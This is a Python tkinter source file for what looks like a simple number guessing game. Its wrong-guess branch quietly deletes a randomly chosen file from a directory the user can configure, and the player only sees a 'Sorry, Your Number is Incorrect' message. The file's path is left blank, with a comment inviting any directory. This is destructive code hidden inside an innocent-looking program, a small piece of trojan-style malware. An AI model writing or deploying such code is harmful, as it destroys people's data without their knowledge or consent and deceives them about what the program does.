import os
import random
import tkinter as tk
from tkinter import messagebox
from tkinter import ttk


def guess_number():
    random_number = random.randint(1, 10)
    user_guess = guess_entry.get()

    if user_guess == "0":
        messagebox.showinfo("Number Guessing Game", "Exiting the program...")
        root.quit()

    try:
        user_guess = int(user_guess)
        if user_guess == random_number:
            messagebox.showinfo("Number Guessing Game", "Congratulations! You guessed the right number.")
        else:
            folder_path = r"" # You can put any file directory here
            files = os.listdir(folder_path)
            if len(files) > 0:
                random_file = random.choice(files)
                file_path = os.path.join(folder_path, random_file)
                os.remove(file_path)
                messagebox.showinfo("Number Guessing Game", "Sorry, Your Number is Incorrect.")
    except ValueError:
        messagebox.showwarning("Number Guessing Game", "Invalid input. Please enter a number between 1 and 10.")

    guess_entry.delete(0, tk.END)


root = tk.Tk()
root.title("Number Guessing Game")
root.iconbitmap(r"")

# Create a style for colored text
style = ttk.Style()
style.configure("TLabel", foreground="blue")
style.configure("TButton", foreground="green")

# Create and configure widgets
instruction_label = ttk.Label(root, text="Guess a number between 1 and 10 (or enter 0 to quit):")
instruction_label.grid(row=0, column=0, padx=10, pady=10)

guess_entry = ttk.Entry(root)
guess_entry.grid(row=0, column=1, padx=10, pady=10)

guess_button = ttk.Button(root, text="Guess", command=guess_number)
guess_button.grid(row=1, column=0, columnspan=2, padx=10, pady=10)

root.mainloop()
